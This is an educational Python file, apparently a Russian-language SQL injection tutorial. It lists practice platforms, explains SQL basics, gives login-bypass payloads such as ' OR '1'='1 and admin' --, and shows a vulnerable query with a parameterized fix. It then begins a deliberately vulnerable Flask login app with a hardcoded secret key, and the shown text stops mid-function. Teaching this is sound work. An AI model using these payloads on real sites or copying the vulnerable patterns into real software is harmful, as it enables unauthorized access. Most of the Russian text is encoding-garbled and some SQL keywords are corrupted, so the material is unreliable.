# =======================================================================================================================================
# –ê—Ç–∞–∫–∏ –Ω–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è - —ç—Ç–æ –æ–¥–∏–Ω –∏–∑ –æ—Å–Ω–æ–≤–Ω—ã—Ö –∞—Å–ø–µ–∫—Ç–æ–≤ —Ö–∞–∫–∏–Ω–≥–∞, –∫–æ—Ç–æ—Ä—ã–π —Ñ–æ–∫—É—Å–∏—Ä—É–µ—Ç—Å—è –Ω–∞ –ø–æ–∏—Å–∫–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –≤ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–∏ –∏ 
# –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö —Å —Ü–µ–ª—å—é –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–µ—Å–∞–Ω–∫—Ü–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–∞–Ω–Ω—ã–º –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π.
# ========================================================================================================================================

# 1. Hack The –í–æ—Ö (–ù–¢–í)
# Hack The –í–æ—Ö - —ç—Ç–æ –ø–æ–ø—É–ª—è—Ä–Ω–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è –ø—Ä–∞–∫—Ç–∏–∫–∏ –≤ –æ–±–ª–∞—Å—Ç–∏ –∫–∏–±–µ—Ä¬≠–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∫–æ—Ç–æ—Ä–∞—è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–µ –º–∞—à–∏–Ω—ã –∏ —Ä–µ–∞–ª—å–Ω—ã–µ 
# —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–ª—è –≤–∑–ª–æ–º–∞. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –º–æ–≥—É—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –∑–∞–¥–∞—á–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è, –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ
# –∞—Ç–∞–∫–∏ –∏ –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ.

# 2. TryHackMe
# TryHack–úe - —ç—Ç–æ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∏ –ø—Ä–∞–∫—Ç–∏–∫–∏ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –û–Ω–∞ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —É—á–µ–±–Ω—ã–µ –∫–æ–º–Ω–∞—Ç—ã –∏ —Å—Ü–µ¬≠–Ω–∞—Ä–∏–∏, 
# –∫–æ—Ç–æ—Ä—ã–µ –æ—Ö–≤–∞—Ç—ã–≤–∞—é—Ç —à–∏—Ä–æ–∫–∏–π —Å–ø–µ–∫—Ç—Ä —Ç–µ–º, –≤–∫–ª—é—á–∞—è –≤–µ–±-–∞—Ç–∞–∫–∏, —Å–µ—Ç–µ–≤—É—é –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å –∏ —Ü–∏—Ñ—Ä–æ–≤—É—é –∫—Ä–∏–º–∏–Ω–∞–ª–∏—Å—Ç–∏–∫—É.

# 3. –ûWASP WebGoat
# OWASP WebGoat - —ç—Ç–æ —É—á–µ–±–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Å –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ –æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–º–∏ —É—è–∑–≤–∏–º–æ—Å—Ç—è–º–∏, –∫–æ—Ç–æ—Ä–æ–µ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –∏–∑—É—á–∞—Ç—å –∏ –ø—Ä–∞–∫—Ç–∏–∫–æ–≤–∞—Ç—å 
# —Ä–∞–∑–ª–∏—á–Ω—ã–µ –≤–µ–±-–∞—Ç–∞–∫–∏. –û–Ω–æ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è —Ä–∞–∑–ª–∏—á–Ω—ã–µ —É—Ä–æ–∫–∏ –∏ –∑–∞–¥–∞–Ω–∏—è –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.

# 4. Damn Vulnera–´e Web Application (DVWA)
# DVWA - —ç—Ç–æ –Ω–∞–º–µ—Ä–µ–Ω–Ω–æ —É—è–∑–≤–∏–º–æ–µ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, —Å–æ–∑–¥–∞–Ω–Ω–æ–µ –¥–ª—è –æ–±—É¬≠—á–µ–Ω–∏—è –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞–≤—ã–∫–æ–≤ –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π. 
# –û–Ω–æ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –º–Ω–æ–∂–µ—Å—Ç–≤–æ –∑–∞–¥–∞—á —Ä–∞–∑–Ω–æ–≥–æ —É—Ä–æ–≤–Ω—è —Å–ª–æ–∂–Ω–æ—Å—Ç–∏, –æ—Ç –ø—Ä–æ—Å—Ç—ã—Ö –¥–æ —Å–ª–æ–∂–Ω—ã—Ö.

# 5. PortSwigger Web Security Academy
# PortSwigger Web Security Academy –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–µ —É—á–µ–±¬≠–Ω—ã–µ –º–∞—Ç–µ—Ä–∏–∞–ª—ã –∏ –ª–∞–±–æ—Ä–∞—Ç–æ—Ä–∏–∏ –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∏ –ø—Ä–∞–∫—Ç–∏–∫–∏ –∞—Ç–∞–∫ –Ω–∞ –≤–µ–±¬≠–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. 
# –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ –æ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç –º–Ω–æ–∂–µ—Å—Ç–≤–æ —Ç–µ–º, –≤–∫–ª—é—á–∞—è SQL¬≠-–∏–Ω—ä–µ–∫—Ü–∏–∏, XSS, CSRF –∏ –¥—Ä—É–≥–∏–µ.

# 6. PentesterLab
# PentesterLab –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç —É–ø—Ä–∞–∂–Ω–µ–Ω–∏—è –∏ —Å—Ü–µ–Ω–∞—Ä–∏–∏ –¥–ª—è –æ–±—É—á–µ–Ω–∏—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞¬≠–Ω–∏—é –Ω–∞ –ø—Ä–æ–Ω–∏–∫–Ω–æ–≤–µ–Ω–∏–µ –∏ –≤–µ–±-–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. 
# –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ –æ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç —à–∏¬≠—Ä–æ–∫–∏–π —Å–ø–µ–∫—Ç—Ä —Ç–µ–º –∏ –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–µ –∑–∞–¥–∞–Ω–∏—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞¬≠–Ω–∏–µ–º —Ä–µ–∞–ª—å–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π.

# 7. HackThisSite
# HackThisSite - —ç—Ç–æ –±–µ—Å–ø–ª–∞—Ç–Ω–∞—è —É—á–µ–±–Ω–∞—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è –∏–∑—É—á–µ–Ω–∏—è –∏ –ø—Ä–∞–∫¬≠—Ç–∏–∫–∏ —Ö–∞–∫–µ—Ä—Å–∫–∏—Ö –Ω–∞–≤—ã–∫–æ–≤. –û–Ω–∞ –ø—Ä–µ–¥–ª–∞–≥–∞–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —É—Ä–æ–≤–Ω–∏ –∑–∞–¥–∞—á –∏ —Å—Ü–µ¬≠–Ω–∞—Ä–∏–µ–≤, 
# –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–º–æ–≥–∞—é—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –∏–∑—É—á–∞—Ç—å –æ—Å–Ω–æ–≤—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –∞—Ç–∞–∫ –Ω–∞ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.

# ============================================== –û—Å–Ω–æ–≤—ã –ø–æ –±–∞–∑–∞–º –¥–∞–Ω–Ω—ã—Ö ============================================================

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö (–ë–î) - —ç—Ç–æ –æ—Ä–≥–∞–Ω–∏–∑–æ–≤–∞–Ω–Ω—ã–π –Ω–∞–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö, —Ö—Ä–∞¬≠–Ω–∏–º—ã—Ö –∏ —É–ø—Ä–∞–≤–ª—è–µ–º—ã—Ö —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —á—Ç–æ–±—ã –æ–±–ª–µ–≥—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, 
# –µ—ë –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—é –∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ. –ë–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –∏—Å¬≠–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö, –æ—Ç –≤–µ–±-—Å–∞–π—Ç–æ–≤ –∏ –±–∏–∑–Ω–µ—Å¬≠-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –¥–æ –Ω–∞—É—á–Ω—ã—Ö 
# –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–π –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∫–æ—Ä–ø–æ—Ä–∞¬≠—Ç–∏–≤–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏.

# –û—Å–Ω–æ–≤–Ω—ã–µ –ø–æ–Ω—è—Ç–∏—è –∏ —Ç–µ—Ä–º–∏–Ω—ã SQL
# SQL (Structured Query Language) - —ç—Ç–æ —è–∑—ã–∫ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Ä–µ–ª—è—Ü–∏–æ–Ω–Ω—ã–º–∏ –±–∞–∑–∞–º–∏ –¥–∞–Ω–Ω—ã—Ö. 
# –û–Ω –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—ã–ø–æ–ª–Ω—è—Ç—å —Å–ª–µ–¥—É—é—â–∏–µ –æ—Å–Ω–æ–≤–Ω—ã–µ –æ–ø–µ—Ä–∞—Ü–∏–∏:
# DML (Data Manipulation Language): –û–ø–µ—Ä–∞—Ü–∏–∏ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ –¥–∞–Ω–Ω—ã–º–∏.
# SELECT - –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ç–∞–±–ª–∏—Ü—ã.
# INSERT - –≤—Å—Ç–∞–≤–∫–∞ –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö –≤ —Ç–∞–±–ª–∏—Ü—É.
# UPDATE - –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –¥–∞–Ω–Ω—ã—Ö –≤ —Ç–∞–±–ª–∏—Ü–µ.
# DELETE - —É–¥–∞–ª–µ–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∏–∑ —Ç–∞–±–ª–∏—Ü—ã.

# DDL (Data Definition Language): –û–ø–µ—Ä–∞—Ü–∏–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö.
# CREATE - —Å–æ–∑–¥–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö, —Ç–∞–∫–∏—Ö –∫–∞–∫ —Ç–∞–±–ª–∏—Ü—ã, –∏–Ω–¥–µ–∫—Å—ã –∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö.
# ALTER - –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –æ–±—ä–µ–∫—Ç–æ–≤ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö.
# DROP - —É–¥–∞–ª–µ–Ω–∏–µ –æ–±—ä–µ–∫—Ç–æ–≤ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö.

# DCL (Data Control Language): –û–ø–µ—Ä–∞—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–æ–º.
# GRA –¢ - –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–∞–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –∏–ª–∏ —Ä–æ–ª—è–º.
# REVOKE- –æ—Ç–∑—ã–≤ —Ä–∞–Ω–µ–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã—Ö –ø—Ä–∞–≤.

# TCL (Transaction Control Language): –û–ø–µ—Ä–∞—Ü–∏–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏.
# –°–û–ú–ú–ü- —Ñ–∏–∫—Å–∞—Ü–∏—è –∏–∑–º–µ–Ω–µ–Ω–∏–π, –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã—Ö –≤ —Ä–∞–º–∫–∞—Ö —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.
# ROLLBACK - –æ—Ç–∫–∞—Ç –∏–∑–º–µ–Ω–µ–Ω–∏–π, –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—ã—Ö –≤ —Ä–∞–º–∫–∞—Ö —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.
# SAVEPOINT - —Å–æ–∑–¥–∞–Ω–∏–µ —Ç–æ—á–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤–Ω—É—Ç—Ä–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏, –∫ –∫–æ—Ç–æ—Ä–æ–π –º–æ–∂–Ω–æ –≤–µ—Ä–Ω—É—Ç—å—Å—è.

# –ó–∞–ø—Ä–æ—Å—ã SQL
# SQL-–∑–∞–ø—Ä–æ—Å—ã –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö. –û–Ω–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –ø—Ä–æ—Å—Ç—ã–º–∏ –∏ —Å–ª–æ–∂–Ω—ã–º–∏, –≤–∫–ª—é—á–∞—é—â–∏–º–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ç–∞–±–ª–∏—Ü –∏ –æ–ø–µ—Ä–∞—Ü–∏–π.
# SELECT * FROM users WHERE age > 18;

# –û–±—ä–µ–¥–∏–Ω–µ–Ω–∏–µ —Ç–∞–±–ª–∏—Ü (JOIN)
# INNER JOIN - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å–æ–≤–ø–∞–¥–∞—é—â–∏–µ –∑–∞–ø–∏—Å–∏ –∏–∑ –æ–±–µ–∏—Ö —Ç–∞–±–ª–∏—Ü.
# LEFT JOIN - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤—Å–µ –∑–∞–ø–∏—Å–∏ –∏–∑ –ª–µ–≤–æ–π —Ç–∞–±–ª–∏—Ü—ã –∏ —Å–æ–≤–ø–∞–¥–∞—é—â–∏–µ –∑–∞–ø–∏—Å–∏ –∏–∑ –ø—Ä–∞–≤–æ–π —Ç–∞–±–ª–∏—Ü—ã.
# RIGHT JOIN - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤—Å–µ –∑–∞–ø–∏—Å–∏ –∏–∑ –ø—Ä–∞–≤–æ–π —Ç–∞–±–ª–∏—Ü—ã –∏ —Å–æ–≤–ø–∞–¥–∞—é¬≠—â–∏–µ –∑–∞–ø–∏—Å–∏ –∏–∑ –ª–µ–≤–æ–π —Ç–∞–±–ª–∏—Ü—ã.
# FULL JOIN - –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤—Å–µ –∑–∞–ø–∏—Å–∏, –∫–æ–≥–¥–∞ –µ—Å—Ç—å —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –≤ –ª–µ–≤–æ–π –∏–ª–∏ –ø—Ä–∞–≤–æ–π —Ç–∞–±–ª–∏—Ü–µ.

# ==================================================== –í–Ω–µ–¥—Ä–µ–Ω–∏–µ SQL-–∏–Ω—ä–µ–∫—Ü–∏–π ========================================================

# SQL-–∏–Ω—ä–µ–∫—Ü–∏—è - —ç—Ç–æ —Ç–∏–ø –∞—Ç–∞–∫–∏, –ø—Ä–∏ –∫–æ—Ç–æ—Ä–æ–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω¬≠–Ω–∏–∫ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç SQL-–∑–∞–ø—Ä–æ—Å—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –¥–∞–Ω–Ω—ã–º –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è 
# –æ–ø–µ—Ä–∞—Ü–∏–π –Ω–∞–¥ –Ω–∏–º–∏. –û—Å–Ω–æ–≤–Ω–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤–æ–∑–Ω–∏–∫–∞–µ—Ç, –∫–æ–≥–¥–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –æ–±—Ä–∞–±–∞¬≠—Ç—ã–≤–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥ –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –≤—Å—Ç–∞–≤–∫—É 
# SQL-–∫o–¥a –≤ SQL-–∑anpoc—ã.

# SELECT * FROM users WHERE username = 'admin' AND password = 'password'
# –ï—Å–ª–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–≤–µ–¥–µ—Ç –≤ –ø–æ–ª–µ –ø–∞—Ä–æ–ª—è —Å–ª–µ–¥—É—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: password' OR '1'='1, —Ç–æ SQL-–∑a–øpoc –ø—Ä–∏–º–µ—Ç —Å–ª–µ–¥—É—é—â–∏–π –≤–∏–¥:
# SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR '1' = '1'
# –ß—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –≤—ã–±–æ—Ä–∫–µ –≤—Å–µ—Ö –∑–∞–ø–∏—Å–µ–π –∏–∑ —Ç–∞–±–ª–∏—Ü—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, —Ç–∞–∫ –∫–∞–∫ —É—Å–ª–æ–≤–∏–µ 1 = 1 –≤—Å–µ–≥–¥–∞ –∏—Å—Ç–∏–Ω–Ω–æ.

# SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏
# –ü—Ä–µ–¥–ø–æ–ª–æ–∂–∏–º, —É –Ω–∞—Å –µ—Å—Ç—å —Ñ–æ—Ä–º–∞ –≤—Ö–æ–¥–∞ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç–µ, –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–æ¬≠–¥–∏—Ç —Å–≤–æ–∏ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ. 
# SQL-–∑a–øpoc –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –º–æ¬≠–∂–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫:
# SELECT * FROM users WHERE username = '–≤–≤–µ–¥–µ–Ω–Ω–æ–µ_–∏–º—è' AND password = '–≤–≤–µ–¥–µ–Ω–Ω—ã–π_–ø–∞—Ä–æ–ª—å';

# –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –≤–≤–µ—Å—Ç–∏ –≤ –ø–æ–ª–µ "–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è" —Å–ª–µ–¥—É—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ: admin' --
# –¢–µ–ø–µ—Ä—å SQL-–∑a–øpoc –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å —Ç–∞–∫:
# SELECT * FROM users WHERE username = 'admin' -- ' AND password = '–≤–≤–µ–¥–µ–Ω–Ω—ã–π_–ø–∞—Ä–æ–ª—å';

# –ø—Ä–∏–º–µ—Ä –∫–æ–¥–∞, –∫–æ—Ç–æ—Ä—ã–π –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∫ SQL-–∏–Ω—ä–µ–∫—Ü–∏—è–º:
import sqlite3

# –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö SQLite
conn = sqlite3.connect('example.db')
cursor = conn.cursor()

# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤–≤–æ–¥–∞
username = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ")

# –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ SQL-–∑a–øpoca
sql_query = "SELECT * FROM users WHERE username = '{}'".format(username)

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑a–øpoca
cursor.execute(sql_query)

# –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∑–∞–ø—Ä–æ—Å–∞
results = cursor.fetchall()

# –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
for row in results:
    print(row)

# –ó–∞–∫—Ä—ã—Ç–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
conn.close()

# –ø—Ä–∏–º–µ—Ä, –∫–∞–∫ –º–æ–∂–Ω–æ –∏—Å–ø—Ä–∞–≤–∏—Ç—å —É—è–∑–≤–∏–º—ã–π –∫–æ–¥
import sqlite3

# –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö SQLite
conn = sqlite3.connect('example.db')
cursor = conn.cursor()

# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤–≤–æ–¥–∞
username = input("–í–≤–µ–¥–∏—Ç–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: ")

# –§–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–µ SQL-–∑a–øpoca —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
sql_query = "SELECT * FROM users WHERE username = ?"

# –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ SQL-–∑a–øpoca —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∏–∑–∞—Ü–∏–∏
cursor.execute(sql_query, (username,))

# –ü–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –∑–∞–ø—Ä–æ—Å–∞
results = cursor.fetchall()

# –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
for row in results:
    print(row)

# –ó–∞–∫—Ä—ã—Ç–∏–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
conn.close()

# ======================================================================================================================================

# –°–æ–∑–¥–∞–Ω–∏–µ —É—è–∑–≤–∏–º–æ–≥–æ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:
# –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: pip install flask
# SQL-–∑–∞–ø—Ä–æ—Å –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—Å—è –≤: SELECT * FROM users WHERE username='admin' --' AND password='...'
# –ó–∞–ø—Ä–æ—Å: SELECT * FROM users WHERE username='' OR 1=1 --' AND password='...'

from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
def init_db():
    if not os.path.exists('database.db'):
        conn = sqlite3.connect('database.db')
        c = conn.cursor()
        
        # –°–æ–∑–¥–∞–Ω–∏–µ —Ç–∞–±–ª–∏—Ü—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
        c.execute('''CREATE TABLE users
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                     username TEXT UNIQUE,
                     password TEXT)''')
        
        # –î–æ–±–∞–≤–ª–µ–Ω–∏–µ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        c.execute("INSERT INTO users (username, password) VALUES (?, ?)", 
                 ('admin', 'password123'))
        
        conn.commit()
        conn.close()

init_db()

# –£—è–∑–≤–∏–º–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ª–æ–≥–∏–Ω–∞
def check_credentials(username, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
